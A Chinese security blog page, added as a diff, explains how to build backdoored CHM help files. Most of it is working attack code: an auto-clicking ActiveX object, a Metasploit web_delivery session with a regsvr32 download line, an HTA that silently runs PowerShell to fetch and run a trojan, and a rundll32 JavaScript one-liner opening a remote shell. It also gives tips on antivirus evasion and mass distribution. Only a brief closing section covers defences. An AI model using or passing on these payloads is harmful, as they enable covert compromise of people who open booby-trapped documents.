@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x00 chm 是什么CHM [Compiled Help Manual],即”已编译的帮助文件”,它是微软新一代帮助文件格式,利用HTML作源文,把帮助内容以类似数据库的形式进行编译储存,以.CHM后缀结尾,支持Javascript,VBscript,ActiveX,Java Applet,Flash,以及常见图形文件(GIF,JPEG,PNG),音频视频文件(MID,WAV,AVI)等…,也">
+<meta property="og:type" content="article">
+<meta property="og:title" content="构造无痕CHM后门">
+<meta property="og:url" content="http://mysecroad.github.io/posts/13577.html">
+<meta property="og:site_name" content="忆时光">
+<meta property="og:description" content="0x00 chm 是什么CHM [Compiled Help Manual],即”已编译的帮助文件”,它是微软新一代帮助文件格式,利用HTML作源文,把帮助内容以类似数据库的形式进行编译储存,以.CHM后缀结尾,支持Javascript,VBscript,ActiveX,Java Applet,Flash,以及常见图形文件(GIF,JPEG,PNG),音频视频文件(MID,WAV,AVI)等…,也">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://mysecroad.github.io/posts/13577/1.png">
+<meta property="og:image" content="http://mysecroad.github.io/posts/13577/2.png">
+<meta property="og:image" content="http://mysecroad.github.io/posts/13577/3.png">
+<meta property="og:image" content="http://mysecroad.github.io/posts/13577/4.png">
+<meta property="og:image" content="http://mysecroad.github.io/posts/13577/7.png">
+<meta property="og:image" content="http://mysecroad.github.io/posts/13577/11.png">
+<meta property="og:image" content="http://mysecroad.github.io/posts/13577/9.png">
+<meta property="og:image" content="http://mysecroad.github.io/posts/13577/10.png">
+<meta property="og:image" content="http://mysecroad.github.io/posts/13577/5.png">
+<meta property="og:image" content="http://mysecroad.github.io/posts/13577/6.png">
+<meta property="og:image" content="http://mysecroad.github.io/posts/13577/8.png">
+<meta property="article:published_time" content="2019-10-29T08:36:55.000Z">
+<meta property="article:modified_time" content="2019-10-29T11:39:52.231Z">
+<meta property="article:author" content="ca5tle">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mysecroad.github.io/posts/13577/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>构造无痕CHM后门</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="忆时光" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/images/">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/57536.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/35747.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://mysecroad.github.io/posts/13577.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://mysecroad.github.io/posts/13577.html&text=构造无痕CHM后门" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://mysecroad.github.io/posts/13577.html&title=构造无痕CHM后门" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://mysecroad.github.io/posts/13577.html&is_video=false&description=构造无痕CHM后门" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=构造无痕CHM后门&body=Check out this article: http://mysecroad.github.io/posts/13577.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://mysecroad.github.io/posts/13577.html&title=构造无痕CHM后门" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://mysecroad.github.io/posts/13577.html&title=构造无痕CHM后门" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://mysecroad.github.io/posts/13577.html&title=构造无痕CHM后门" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://mysecroad.github.io/posts/13577.html&title=构造无痕CHM后门" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://mysecroad.github.io/posts/13577.html&name=构造无痕CHM后门&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://mysecroad.github.io/posts/13577.html&t=构造无痕CHM后门" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-chm-是什么"><span class="toc-number">1.</span> <span class="toc-text">0x00 chm 是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-chm-制作"><span class="toc-number">2.</span> <span class="toc-text">0x01 chm 制作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-借助chm实现meterpreter上线"><span class="toc-number">3.</span> <span class="toc-text">0x02 借助chm实现meterpreter上线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-利用chm实现自定义木马上线"><span class="toc-number">4.</span> <span class="toc-text">0x03 利用chm实现自定义木马上线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-利用js来无痕触发chm后门"><span class="toc-number">5.</span> <span class="toc-text">0x04 利用js来无痕触发chm后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-针对chm的后门的有效防御"><span class="toc-number">6.</span> <span class="toc-text">0x05 针对chm的后门的有效防御</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        构造无痕CHM后门
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">忆时光</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-10-29T08:36:55.000Z" itemprop="datePublished">2019-10-29</time>
+        
+        (Updated: <time datetime="2019-10-29T11:39:52.231Z" itemprop="dateModified">2019-10-29</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-chm-是什么"><a href="#0x00-chm-是什么" class="headerlink" title="0x00 chm 是什么"></a>0x00 chm 是什么</h2><p>CHM [Compiled Help Manual],即”已编译的帮助文件”,它是微软新一代帮助文件格式,利用HTML作源文,把帮助内容以类似数据库的形式进行编译储存,以.CHM后缀结尾,支持Javascript,VBscript,ActiveX,Java Applet,Flash,以及常见图形文件(GIF,JPEG,PNG),音频视频文件(MID,WAV,AVI)等…,也就是说,我们可以直接利用chm去肆意地访问各类网络资源,另外,因其使用方便,形式多样,通常也多被采用作为电子书的默认格式。</p>
+<h2 id="0x01-chm-制作"><a href="#0x01-chm-制作" class="headerlink" title="0x01 chm 制作"></a>0x01 chm 制作</h2><p>新建一个文件夹，里面有一个test.html，内容随意<br><img src="/posts/13577/1.png" alt></p>
+<p>打开EasyCHM，新建-&gt;浏览。选择该目录。默认文件类型<br><img src="/posts/13577/2.png" alt></p>
+<p>点击确认，即可看到预览的CHM文件<br><img src="/posts/13577/3.png" alt></p>
+<p>选择文件—编译，即可编译成CHM文件。</p>
+<p><strong>举个例子</strong></p>
+<p>弹出计算器</p>
+<p>test.html 的内容为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line">&lt;META HTTP-EQUIV&#x3D;&quot;Content-Type&quot; Content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;TITLE&gt;test&lt;&#x2F;TITLE&gt;</span><br><span class="line">&lt;&#x2F;HEAD&gt;</span><br><span class="line"></span><br><span class="line">&lt;BODY BGCOLOR&#x3D;&quot;#FFFFFF&quot; TEXT&#x3D;&quot;#000000&quot;&gt;</span><br><span class="line">&lt;OBJECT id&#x3D;autoloader classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width&#x3D;1 height&#x3D;1&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Command&quot; value&#x3D;&quot;ShortCut&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Button&quot; value&#x3D;&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&quot;,calc.exe,&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Item2&quot; value&#x3D;&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;&#x2F;OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">	autoloader.Click();</span><br><span class="line">&lt;&#x2F;SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;Just a test!&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;BODY&gt;</span><br><span class="line">&lt;&#x2F;HTML&gt;</span><br></pre></td></tr></table></figure>
+<p><code>&lt;OBJECT&gt;</code> 和 <code>&lt;SCRIPT&gt;</code> 为核心代码，只需将这段代码插入任意html中即可。</p>
+<p>按照上述过程制作test.chm文件<br>双击生成的.chm文件<br><img src="/posts/13577/4.png" alt></p>
+<h2 id="0x02-借助chm实现meterpreter上线"><a href="#0x02-借助chm实现meterpreter上线" class="headerlink" title="0x02 借助chm实现meterpreter上线"></a>0x02 借助chm实现meterpreter上线</h2><p>既然现在都能弹计算器了,很明显,弹个meterpreter又会有多难呢,首先,先把msf起起来准备好相应的payload,如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery </span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; set target 3</span><br><span class="line">target &#x3D;&gt; 3</span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp_uuid </span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp_uuid</span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; set lhost 192.168.72.23</span><br><span class="line">lhost &#x3D;&gt; 192.168.72.23</span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; set lport 5555</span><br><span class="line">lport &#x3D;&gt; 5555</span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; set exitonsession false</span><br><span class="line">exitonsession &#x3D;&gt; false</span><br><span class="line">msf5 exploit(multi&#x2F;script&#x2F;web_delivery) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.72.23:5555 </span><br><span class="line">[*] Using URL: http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;CSw0SdX2n23YH</span><br><span class="line">[*] Local IP: http:&#x2F;&#x2F;192.168.72.23:8080&#x2F;CSw0SdX2n23YH</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.72.23:8080&#x2F;CSw0SdX2n23YH.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+<p>接着,只需要把弹计算器部分的命令替换成上面远程加载执行payload的命令即可,而后再重新编译为chm</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;OBJECT id&#x3D;autoloader classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width&#x3D;1 height&#x3D;1&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Command&quot; value&#x3D;&quot;ShortCut&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Button&quot; value&#x3D;&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&quot;,regsvr32,&#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.3.14:8080&#x2F;WzRAPJ4u2Pp2IAL.sct scrobj.dll&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Item2&quot; value&#x3D;&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;&#x2F;OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">	autoloader.Click();</span><br><span class="line">&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>不过，在目标执行chm文件之后，却出现如下错误，目前尚未解决<br><img src="/posts/13577/7.png" alt></p>
+<h2 id="0x03-利用chm实现自定义木马上线"><a href="#0x03-利用chm实现自定义木马上线" class="headerlink" title="0x03 利用chm实现自定义木马上线"></a>0x03 利用chm实现自定义木马上线</h2><p><strong>注意:</strong> 最好不要再直接用powershell或者cmd去远程执行下载,不然在打开chm时会飘黑框</p>
+<p>为了能让chm在打开时不弹黑框,此处我们就用一种比较间接的方式,用hta来帮我们在前面挡一刀,即 用先在chm里执行hta,而hta里放的则是远程加载执行我们自己马的powershell代码,具体如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># &#x2F;etc&#x2F;init.d&#x2F;apache2 start</span><br><span class="line"># mv &#x2F;home&#x2F;test&#x2F;Desktop&#x2F;chmbackdoor.exe &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line"># mv &#x2F;home&#x2F;test&#x2F;Desktop&#x2F;downloader.sct &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line"># netstat -tulnp</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># cat loader.hta		可以清晰的看到,此hta中放的才是真正的ps下载者</span><br><span class="line"></span><br><span class="line">&lt;HTML&gt; </span><br><span class="line">	&lt;HEAD&gt;</span><br><span class="line">	&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">	&lt;script language&#x3D;&quot;VBScript&quot;&gt;</span><br><span class="line">	Sub window_onload</span><br><span class="line">		window.resizeTo 0,0</span><br><span class="line">		window.MoveTo -100,-100</span><br><span class="line">		const impersonation &#x3D; 3</span><br><span class="line">		Const HIDDEN_WINDOW &#x3D; 12</span><br><span class="line">		Set Locator &#x3D; CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">		Locator.Run&quot;PowerShell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.3.14&#x2F;chmbackdoor.exe&#39;,&#39;c:\\windows\\temp\\chmbackdoor.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;c:\\windows\\temp\\chmbackdoor.exe&#39;);&quot;,0,FALSE</span><br><span class="line">		window.close()</span><br><span class="line">	end sub</span><br><span class="line">	&lt;&#x2F;script&gt;</span><br><span class="line">	&lt;&#x2F;HEAD&gt;</span><br><span class="line">&lt;&#x2F;HTML&gt;</span><br></pre></td></tr></table></figure>
+<p>而在chm文件中则是执行上面hta,但执行hta本身却是没有黑框的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;OBJECT id&#x3D;autoloader classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width&#x3D;1 height&#x3D;1&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Command&quot; value&#x3D;&quot;ShortCut&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Button&quot; value&#x3D;&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&quot;,mshta,http:&#x2F;&#x2F;192.168.3.14&#x2F;loader.hta&quot;&gt;</span><br><span class="line">	&lt;PARAM name&#x3D;&quot;Item2&quot; value&#x3D;&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;&#x2F;OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">	autoloader.Click();</span><br><span class="line">&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+<p>当目标正常双击打开我们发给他的chm文件时,稍等片刻[ps下载稍微需要点儿时间],另外,因为是下载自己的马,所以免杀和马的体积[越小越好]要务必处理好<br><img src="/posts/13577/11.png" alt></p>
+<h2 id="0x04-利用js来无痕触发chm后门"><a href="#0x04-利用js来无痕触发chm后门" class="headerlink" title="0x04 利用js来无痕触发chm后门"></a>0x04 利用js来无痕触发chm后门</h2><p><strong>第一种方式</strong><br>直接powershell脚本来免杀弹回一个半交互的shell，这种方式通常比较适合针对单个单点拿shell,可能需要人一直守着,一旦看到上了以后,就需要里面进行下一步的动作,脚本的具体使用,如下,先修改监听ip,为本机ip[实战中肯定是用vps的公网ip来搞]</p>
+<p><a href="https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1" target="_blank" rel="noopener" title="JSRat.ps1">https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Server &#x3D; &#39;192.168.72.23&#39; #Listening IP. Change This.</span><br></pre></td></tr></table></figure>
+<p>而后加载执行脚本开始监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -File JSRat.ps1</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/13577/9.png" alt><br>接下来的事情就是把下面的利用代码替换到我们事先准备好的chm中,具体如下,记得里面的ip要改成上面监听的ip,另外,务必要注意value=中的单双引号问题,否则语法错误会造成payload无法被正常执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h&#x3D;new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);w&#x3D;new%20ActiveXObject(&quot;WScript.Shell&quot;);try&#123;v&#x3D;w.RegRead(&quot;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer&quot;);q&#x3D;v.split(&quot;&#x3D;&quot;)[1].split(&quot;;&quot;)[0];h.SetProxy(2,q);&#125;catch(e)&#123;&#125;h.Open(&quot;GET&quot;,&quot;http:&#x2F;&#x2F;192.168.72.11&#x2F;connect&quot;,false);try&#123;h.Send();B&#x3D;h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd &#x2F;c taskkill &#x2F;f &#x2F;im rundll32.exe&quot;,0,true);&#125;</span><br></pre></td></tr></table></figure>
+<p>之后,再重新编译chm,丢到目标机器上打开,即可看到一个cmd shell被正常弹回,只不过,这里稍微有点瑕疵,当第一次打开chm的一瞬间,会有所卡顿[其实这个过程就是在执行payload,也可能是rudll32的问题,regsvr32就不会],而之后再打开,就没有多大感觉了</p>
+<p>Shell回来以后,为了巩固权限,可立即远程加载执行自己的马,毕竟,一个cmd shell肯定活不了多长时间<br><img src="/posts/13577/10.png" alt></p>
+<p><strong>第二种方式</strong></p>
+<p>原理一样,只不过这次是用python脚本,主要针对想自动批量上线的需求[适合群发]<br><a href="https://github.com/Ridter/MyJSRat" target="_blank" rel="noopener" title="MyJSRat.py">https://github.com/Ridter/MyJSRat</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python MyJSRat.py -i 192.168.1.101 -p 3333</span><br></pre></td></tr></table></figure>
+<p>访问 <a href="http://192.168.72.23:3333/wtf" target="_blank" rel="noopener">http://192.168.72.23:3333/wtf</a> 获取攻击代码如下：<br><img src="/posts/13577/5.png" alt></p>
+<p>将攻击代码写入html文件<br><img src="/posts/13577/6.png" alt></p>
+<p>编译以后运行，可以成功获取JS交互shell<br><img src="/posts/13577/8.png" alt></p>
+<h2 id="0x05-针对chm的后门的有效防御"><a href="#0x05-针对chm的后门的有效防御" class="headerlink" title="0x05 针对chm的后门的有效防御"></a>0x05 针对chm的后门的有效防御</h2><ol>
+<li>利用windows自带的hh命令,便可以轻松反编译chm源文件,通过看源文件中的代码很容易就能发现此类后门<br>具体命令格式如下: # hh -decompile C:\Users\scan\Desktop\new C:\Users\scan\Desktop\works\source.chm</li>
+<li>严禁随意打开别人发过来的各种chm文件,很多人就是通过这种方式,把程序员经常用到的一些开发手册[通常都是chm文件]加工成后门后往各个站点里发,以此发来大批量挂马收集肉鸡</li>
+</ol>
+
+  </div>
+</article>
+
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: 'euAQjqlW2tS4fVHxsmyLkdLj-gzGzoHsz',
+            appKey: 'Fmn6CIIN9yyDif6AC2hxSglA',
+            placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+            avatar: 'robohash'
+        })
+    </script>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/images/">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-chm-是什么"><span class="toc-number">1.</span> <span class="toc-text">0x00 chm 是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-chm-制作"><span class="toc-number">2.</span> <span class="toc-text">0x01 chm 制作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-借助chm实现meterpreter上线"><span class="toc-number">3.</span> <span class="toc-text">0x02 借助chm实现meterpreter上线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-利用chm实现自定义木马上线"><span class="toc-number">4.</span> <span class="toc-text">0x03 利用chm实现自定义木马上线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-利用js来无痕触发chm后门"><span class="toc-number">5.</span> <span class="toc-text">0x04 利用js来无痕触发chm后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-针对chm的后门的有效防御"><span class="toc-number">6.</span> <span class="toc-text">0x05 针对chm的后门的有效防御</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://mysecroad.github.io/posts/13577.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://mysecroad.github.io/posts/13577.html&text=构造无痕CHM后门" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://mysecroad.github.io/posts/13577.html&title=构造无痕CHM后门" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://mysecroad.github.io/posts/13577.html&is_video=false&description=构造无痕CHM后门" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=构造无痕CHM后门&body=Check out this article: http://mysecroad.github.io/posts/13577.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://mysecroad.github.io/posts/13577.html&title=构造无痕CHM后门" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://mysecroad.github.io/posts/13577.html&title=构造无痕CHM后门" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
